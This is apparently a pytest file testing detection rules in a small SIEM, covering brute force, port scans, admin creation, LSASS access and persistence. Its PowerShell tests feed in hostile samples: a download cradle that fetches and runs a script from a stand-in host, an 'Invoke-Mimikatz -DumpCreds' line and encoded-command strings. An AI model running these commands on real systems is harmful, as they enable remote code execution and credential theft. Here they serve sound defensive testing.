import pytest

from siem import storage
from siem.rules.afterhours_logon import AfterHoursLogonRule
from siem.rules.brute_force import BruteForceRule
from siem.rules.credential_access import CredentialAccessRule
from siem.rules.encoded_powershell import EncodedPowerShellRule
from siem.rules.new_admin_account import NewAdminAccountRule
from siem.rules.persistence import PersistenceRule
from siem.rules.port_scan_detection import PortScanDetectionRule
from siem.rules.powershell_scriptblock import PowerShellScriptBlockRule
from siem.rules.suspicious_parent_child import SuspiciousParentChildRule
from siem.rules.threat_intel_match import ThreatIntelMatchRule


@pytest.fixture
def conn():
    c = storage.connect(":memory:")
    storage.init_db(c)
    return c


def make_event(event_id, ts, user="alice", source_ip="10.0.0.5", computer="HOST", raw_xml=""):
    return {
        "channel": "Security",
        "record_id": 1,
        "ts": ts,
        "event_id": event_id,
        "level": "Information",
        "computer": computer,
        "user": user,
        "source_ip": source_ip,
        "message": "",
        "raw_xml": raw_xml,
    }


def event_data_xml(**fields):
    data = "".join(f"<Data Name='{k}'>{v}</Data>" for k, v in fields.items())
    return (
        "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>"
        "<System></System>"
        f"<EventData>{data}</EventData>"
        "</Event>"
    )


class TestBruteForceRule:
    def test_fires_after_threshold_reached(self, conn):
        rule = BruteForceRule(event_id=4625, threshold=3, window_seconds=60)
        base_ts = "2026-08-04T12:00:0{}.000Z"

        for i in range(2):
            rule.evaluate(conn, make_event(4625, base_ts.format(i)), row_id=i)
        assert len(storage.get_recent_alerts(conn)) == 0  # below threshold

        rule.evaluate(conn, make_event(4625, base_ts.format(2)), row_id=2)
        alerts = storage.get_recent_alerts(conn)
        assert len(alerts) == 1
        assert alerts[0]["rule_id"] == "brute_force"
        assert alerts[0]["mitre_id"] == "T1110"

    def test_does_not_double_alert_within_same_burst(self, conn):
        rule = BruteForceRule(event_id=4625, threshold=2, window_seconds=60)
        base_ts = "2026-08-04T12:00:0{}.000Z"
        for i in range(4):
            rule.evaluate(conn, make_event(4625, base_ts.format(i)), row_id=i)
        # threshold of 2 reached at i=1, i=2, i=3 -- should only alert once
        assert len(storage.get_recent_alerts(conn)) == 1

    def test_ignores_unrelated_event_ids(self, conn):
        rule = BruteForceRule(event_id=4625, threshold=1, window_seconds=60)
        rule.evaluate(conn, make_event(4624, "2026-08-04T12:00:00.000Z"), row_id=1)
        assert len(storage.get_recent_alerts(conn)) == 0

    def test_separate_sources_tracked_independently(self, conn):
        rule = BruteForceRule(event_id=4625, threshold=2, window_seconds=60)
        rule.evaluate(conn, make_event(4625, "2026-08-04T12:00:00.000Z", source_ip="1.1.1.1"), row_id=1)
        rule.evaluate(conn, make_event(4625, "2026-08-04T12:00:01.000Z", source_ip="2.2.2.2"), row_id=2)
        # each source only has 1 attempt -- neither should fire yet
        assert len(storage.get_recent_alerts(conn)) == 0


class TestNewAdminAccountRule:
    def test_new_account_creation_fires(self, conn):
        rule = NewAdminAccountRule()
        rule.evaluate(conn, make_event(4720, "2026-08-04T12:00:00.000Z", user="bob"), row_id=1)
        alerts = storage.get_recent_alerts(conn)
        assert len(alerts) == 1
        assert alerts[0]["mitre_id"] == "T1136"
        assert "bob" in alerts[0]["description"]

    def test_admin_group_addition_fires(self, conn):
        rule = NewAdminAccountRule()
        raw_xml = event_data_xml(TargetUserName="Administrators", MemberName="evil_intern")
        rule.evaluate(conn, make_event(4732, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
        alerts = storage.get_recent_alerts(conn)
        assert len(alerts) == 1
        assert alerts[0]["mitre_id"] == "T1098"
        assert "evil_intern" in alerts[0]["description"]

    def test_non_admin_group_addition_does_not_fire(self, conn):
        rule = NewAdminAccountRule()
        raw_xml = event_data_xml(TargetUserName="Remote Desktop Users", MemberName="bob")
        rule.evaluate(conn, make_event(4732, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
        assert len(storage.get_recent_alerts(conn)) == 0


class TestAfterHoursLogonRule:
    def test_fires_outside_business_hours(self, conn):
        rule = AfterHoursLogonRule(business_hours_start=7, business_hours_end=19)
        raw_xml = event_data_xml(LogonType="2")
        rule.evaluate(conn, make_event(4624, "2026-08-04T03:00:00.000Z", raw_xml=raw_xml), row_id=1)
        assert len(storage.get_recent_alerts(conn)) == 1
        assert storage.get_recent_alerts(conn)[0]["mitre_id"] == "T1078"

    def test_ignores_non_human_logon_types(self, conn):
        rule = AfterHoursLogonRule(business_hours_start=7, business_hours_end=19)
        raw_xml = event_data_xml(LogonType="5")  # Service logon
        rule.evaluate(conn, make_event(4624, "2026-08-04T03:00:00.000Z", raw_xml=raw_xml), row_id=1)
        assert len(storage.get_recent_alerts(conn)) == 0


class TestEncodedPowerShellRule:
    def test_fires_on_encoded_command(self, conn):
        rule = EncodedPowerShellRule()
        raw_xml = event_data_xml(
            Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            CommandLine="powershell.exe -enc SQBFAFgA...",
            User="HOST\\alice",
        )
        rule.evaluate(conn, make_event(1, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
        alerts = storage.get_recent_alerts(conn)
        assert len(alerts) == 1
        assert alerts[0]["mitre_id"] == "T1059.001"

    def test_ignores_plain_powershell(self, conn):
        rule = EncodedPowerShellRule()
        raw_xml = event_data_xml(
            Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            CommandLine="powershell.exe -Command Get-Process",
        )
        rule.evaluate(conn, make_event(1, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
        assert len(storage.get_recent_alerts(conn)) == 0

    def test_ignores_non_powershell_processes(self, conn):
        rule = EncodedPowerShellRule()
        raw_xml = event_data_xml(Image=r"C:\Windows\System32\cmd.exe", CommandLine="cmd.exe -enc foo")
        rule.evaluate(conn, make_event(1, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
        assert len(storage.get_recent_alerts(conn)) == 0


class TestSuspiciousParentChildRule:
    def test_fires_on_office_spawning_powershell(self, conn):
        rule = SuspiciousParentChildRule()
        raw_xml = event_data_xml(
            ParentImage=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
            Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            User="HOST\\alice",
        )
        rule.evaluate(conn, make_event(1, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
        alerts = storage.get_recent_alerts(conn)
        assert len(alerts) == 1
        assert alerts[0]["mitre_id"] == "T1059"

    def test_ignores_benign_parent_child_pairs(self, conn):
        rule = SuspiciousParentChildRule()
        raw_xml = event_data_xml(
            ParentImage=r"C:\Windows\explorer.exe",
            Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        )
        rule.evaluate(conn, make_event(1, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
        assert len(storage.get_recent_alerts(conn)) == 0


def _insert_ioc(conn, ioc_type, value, source="abuse.ch ThreatFox", malware="TestMalware"):
    conn.execute(
        "INSERT INTO threat_intel_iocs (ioc_type, value, source, malware, first_seen) "
        "VALUES (?, ?, ?, ?, datetime('now'))",
        (ioc_type, value, source, malware),
    )
    conn.commit()


class TestThreatIntelMatchRule:
    def test_fires_on_known_malicious_logon_source_ip(self, conn):
        _insert_ioc(conn, "ip", "203.0.113.9")
        rule = ThreatIntelMatchRule()
        rule.evaluate(conn, make_event(4625, "2026-08-04T12:00:00.000Z", source_ip="203.0.113.9"), row_id=1)
        alerts = storage.get_recent_alerts(conn)
        assert len(alerts) == 1
        assert alerts[0]["mitre_id"] == "TA0011"
        assert "TestMalware" in alerts[0]["description"]

    def test_ignores_unknown_logon_source_ip(self, conn):
        _insert_ioc(conn, "ip", "203.0.113.9")
        rule = ThreatIntelMatchRule()
        rule.evaluate(conn, make_event(4624, "2026-08-04T12:00:00.000Z", source_ip="10.0.0.1"), row_id=1)
        assert len(storage.get_recent_alerts(conn)) == 0

    def test_fires_on_outbound_sysmon_connection_to_known_bad_ip(self, conn):
        _insert_ioc(conn, "ip", "198.51.100.7")
        rule = ThreatIntelMatchRule()
        raw_xml = event_data_xml(Initiated="true", DestinationIp="198.51.100.7")
        event = make_event(3, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml)
        event["channel"] = "Microsoft-Windows-Sysmon/Operational"
        rule.evaluate(conn, event, row_id=1)
        alerts = storage.get_recent_alerts(conn)
        assert len(alerts) == 1
        assert "Outbound" in alerts[0]["description"]

    def test_ignores_inbound_sysmon_connection(self, conn):
        _insert_ioc(conn, "ip", "198.51.100.7")
        rule = ThreatIntelMatchRule()
        raw_xml = event_data_xml(Initiated="false", DestinationIp="198.51.100.7")
        event = make_event(3, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml)
        event["channel"] = "Microsoft-Windows-Sysmon/Operational"
        rule.evaluate(conn, event, row_id=1)
        assert len(storage.get_recent_alerts(conn)) == 0


LOCAL_IP = "192.168.1.50"


def _wfp_block_event(ts, record_id, remote_ip, remote_side_is_source, local_port, remote_port="54321"):
    """Builds a synthetic 5157 event. remote_side_is_source controls
    which raw field (SourceAddress vs DestAddress) holds the remote IP,
    exercising the rule's "figure out which side is local" logic from
    both directions."""
    if remote_side_is_source:
        raw_xml = event_data_xml(
            SourceAddress=remote_ip, SourcePort=remote_port,
            DestAddress=LOCAL_IP, DestPort=local_port,
        )
    else:
        raw_xml = event_data_xml(
            SourceAddress=LOCAL_IP, SourcePort=local_port,
            DestAddress=remote_ip, DestPort=remote_port,
        )
    return make_event(5157, ts, raw_xml=raw_xml)


class TestPortScanDetectionRule:
    def test_fires_after_threshold_distinct_ports(self, conn):
        rule = PortScanDetectionRule(distinct_ports_threshold=3, window_seconds=30, local_ips={LOCAL_IP})
        base = "2026-08-04T12:00:0{}.000Z"
        for i, port in enumerate(["22", "80", "443"]):
            event = _wfp_block_event(base.format(i), i, "203.0.113.9", True, local_port=port)
            rule.evaluate(conn, event, row_id=i)
        alerts = storage.get_recent_alerts(conn)
        assert len(alerts) == 1
        assert alerts[0]["mitre_id"] == "T1595"
        assert "203.0.113.9" in alerts[0]["description"]

    def test_does_not_fire_below_threshold(self, conn):
        rule = PortScanDetectionRule(distinct_ports_threshold=5, window_seconds=30, local_ips={LOCAL_IP})
        base = "2026-08-04T12:00:0{}.000Z"
        for i, port in enumerate(["22", "80"]):
            event = _wfp_block_event(base.format(i), i, "203.0.113.9", True, local_port=port)
            rule.evaluate(conn, event, row_id=i)
        assert len(storage.get_recent_alerts(conn)) == 0

    def test_repeated_same_port_does_not_count_as_distinct(self, conn):
        rule = PortScanDetectionRule(distinct_ports_threshold=3, window_seconds=30, local_ips={LOCAL_IP})
        base = "2026-08-04T12:00:0{}.000Z"
        for i in range(5):
            event = _wfp_block_event(base.format(i), i, "203.0.113.9", True, local_port="80")
            rule.evaluate(conn, event, row_id=i)
        # Same port hit 5 times -- still only 1 distinct port, never crosses threshold.
        assert len(storage.get_recent_alerts(conn)) == 0

    def test_works_regardless_of_which_raw_field_holds_the_remote_ip(self, conn):
        """The rule must not assume SourceAddress or DestAddress is
        specifically "remote" -- Microsoft's own docs disagree on this,
        so it determines it empirically against local_ips instead."""
        rule = PortScanDetectionRule(distinct_ports_threshold=3, window_seconds=30, local_ips={LOCAL_IP})
        base = "2026-08-04T12:00:0{}.000Z"
        for i, port in enumerate(["22", "80", "443"]):
            event = _wfp_block_event(base.format(i), i, "203.0.113.9", False, local_port=port)
            rule.evaluate(conn, event, row_id=i)
        alerts = storage.get_recent_alerts(conn)
        assert len(alerts) == 1
        assert alerts[0]["mitre_id"] == "T1595"

    def test_ignores_events_where_neither_side_is_recognized_as_local(self, conn):
        rule = PortScanDetectionRule(distinct_ports_threshold=1, window_seconds=30, local_ips={LOCAL_IP})
        raw_xml = event_data_xml(SourceAddress="203.0.113.9", SourcePort="1234", DestAddress="198.51.100.1", DestPort="80")
        event = make_event(5157, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml)
        rule.evaluate(conn, event, row_id=1)
        assert len(storage.get_recent_alerts(conn)) == 0

    def test_separate_remote_ips_tracked_independently(self, conn):
        rule = PortScanDetectionRule(distinct_ports_threshold=2, window_seconds=30, local_ips={LOCAL_IP})
        rule.evaluate(conn, _wfp_block_event("2026-08-04T12:00:00.000Z", 1, "203.0.113.9", True, local_port="22"), row_id=1)
        rule.evaluate(conn, _wfp_block_event("2026-08-04T12:00:01.000Z", 2, "198.51.100.1", True, local_port="80"), row_id=2)
        # each remote IP only probed 1 port -- neither should fire yet
        assert len(storage.get_recent_alerts(conn)) == 0


class TestPowerShellScriptBlockRule:
    def test_fires_on_download_cradle(self, conn):
        rule = PowerShellScriptBlockRule()
        raw_xml = event_data_xml(
            ScriptBlockText="IEX (New-Object Net.WebClient).DownloadString('http://evil.example/payload.ps1')"
        )
        rule.evaluate(conn, make_event(4104, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
        alerts = storage.get_recent_alerts(conn)
        assert len(alerts) == 1
        assert alerts[0]["mitre_id"] == "T1059.001"
        assert "download cradle" in alerts[0]["description"]

    def test_fires_on_named_offensive_tool(self, conn):
        rule = PowerShellScriptBlockRule()
        raw_xml = event_data_xml(ScriptBlockText="Invoke-Mimikatz -DumpCreds")
        rule.evaluate(conn, make_event(4104, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
        assert len(storage.get_recent_alerts(conn)) == 1

    def test_fires_on_explicit_encoded_command(self, conn):
        rule = PowerShellScriptBlockRule()
        raw_xml = event_data_xml(ScriptBlockText="powershell -EncodedCommand SQBFAFgA")
        rule.evaluate(conn, make_event(4104, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
        assert len(storage.get_recent_alerts(conn)) == 1

    def test_ignores_ordinary_script_blocks(self, conn):
        rule = PowerShellScriptBlockRule()
        raw_xml = event_data_xml(ScriptBlockText="Get-Process | Where-Object { $_.CPU -gt 10 }")
        rule.evaluate(conn, make_event(4104, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
        assert len(storage.get_recent_alerts(conn)) == 0

    def test_ignores_download_without_execution(self, conn):
        # A download alone (e.g. saving an installer to disk) isn't the
        # cradle pattern -- only download + immediate execution should fire.
        rule = PowerShellScriptBlockRule()
        raw_xml = event_data_xml(
            ScriptBlockText="Invoke-WebRequest -Uri http://example.com/file.zip -OutFile file.zip"
        )
        rule.evaluate(conn, make_event(4104, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
        assert len(storage.get_recent_alerts(conn)) == 0

    def test_ignores_unrelated_event_ids(self, conn):
        rule = PowerShellScriptBlockRule()
        raw_xml = event_data_xml(ScriptBlockText="Invoke-Mimikatz")
        rule.evaluate(conn, make_event(4103, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
        assert len(storage.get_recent_alerts(conn)) == 0


class TestCredentialAccessRule:
    def test_fires_on_lsass_access_with_vm_read(self, conn):
        rule = CredentialAccessRule()
        raw_xml = event_data_xml(
            SourceImage=r"C:\Users\bob\AppData\Local\Temp\suspicious.exe",
            TargetImage=r"C:\Windows\System32\lsass.exe",
            GrantedAccess="0x1010",  # includes PROCESS_VM_READ (0x0010)
        )
        rule.evaluate(conn, make_event(10, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
        alerts = storage.get_recent_alerts(conn)
        assert len(alerts) == 1
        assert alerts[0]["mitre_id"] == "T1003"
        assert "suspicious.exe" in alerts[0]["description"]

    def test_ignores_lsass_access_without_vm_read(self, conn):
        rule = CredentialAccessRule()
        raw_xml = event_data_xml(
            SourceImage=r"C:\Windows\System32\svchost.exe",
            TargetImage=r"C:\Windows\System32\lsass.exe",
            GrantedAccess="0x1000",  # PROCESS_QUERY_LIMITED_INFORMATION only
        )
        rule.evaluate(conn, make_event(10, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
        assert len(storage.get_recent_alerts(conn)) == 0

    def test_ignores_process_access_to_other_targets(self, conn):
        rule = CredentialAccessRule()
        raw_xml = event_data_xml(
            SourceImage=r"C:\Windows\System32\svchost.exe",
            TargetImage=r"C:\Windows\explorer.exe",
            GrantedAccess="0x1010",
        )
        rule.evaluate(conn, make_event(10, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
        assert len(storage.get_recent_alerts(conn)) == 0

    def test_ignores_unrelated_event_ids(self, conn):
        rule = CredentialAccessRule()
        raw_xml = event_data_xml(TargetImage=r"C:\Windows\System32\lsass.exe", GrantedAccess="0x1010")
        rule.evaluate(conn, make_event(1, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
        assert len(storage.get_recent_alerts(conn)) == 0


class TestPersistenceRule:
    def test_scheduled_task_creation_fires(self, conn):
        rule = PersistenceRule()
        raw_xml = event_data_xml(TaskName=r"\Microsoft\Windows\evil_task", SubjectUserName="bob")
        rule.evaluate(conn, make_event(4698, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml), row_id=1)
        alerts = storage.get_recent_alerts(conn)
        assert len(alerts) == 1
        assert alerts[0]["mitre_id"] == "T1053.005"
        assert "evil_task" in alerts[0]["description"]

    def test_new_service_installed_fires(self, conn):
        rule = PersistenceRule()
        raw_xml = event_data_xml(ServiceName="EvilSvc", ImagePath=r"C:\Temp\evil.exe")
        event = make_event(7045, "2026-08-04T12:00:00.000Z", raw_xml=raw_xml)
        event["channel"] = "System"
        rule.evaluate(conn, event, row_id=1)
        alerts = storage.get_recent_alerts(conn)
        assert len(alerts) == 1
        assert alerts[0]["mitre_id"] == "T1543.003"
        assert "EvilSvc" in alerts[0]["description"]

    def test_ignores_unrelated_event_ids(self, conn):
        rule = PersistenceRule()
        rule.evaluate(conn, make_event(4624, "2026-08-04T12:00:00.000Z"), row_id=1)
        assert len(storage.get_recent_alerts(conn)) == 0
